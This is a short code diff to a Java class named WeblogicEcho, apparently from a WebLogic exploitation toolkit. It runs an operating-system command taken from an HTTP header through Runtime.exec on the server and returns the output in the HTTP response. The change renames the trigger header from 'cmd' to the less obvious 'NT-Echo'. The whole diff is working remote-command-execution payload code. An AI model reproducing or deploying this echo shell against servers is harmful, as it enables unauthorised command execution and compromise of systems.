@@ -16,7 +16,7 @@ public class WeblogicEcho {
         obj = obj.getClass().getMethod("getServletRequest").invoke(obj);
         ServletResponseImpl servletResponse = (ServletResponseImpl)obj.getClass().getMethod("getResponse").invoke(obj);
 
-        String cmd = (String)obj.getClass().getMethod("getHeader", String.class).invoke(obj, "cmd");
+        String cmd = (String)obj.getClass().getMethod("getHeader", String.class).invoke(obj, "NT-Echo");
         if (cmd != null && !cmd.isEmpty()) {
             String result = (new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A").next();
             servletResponse.getServletOutputStream().writeStream(new StringInputStream(result));
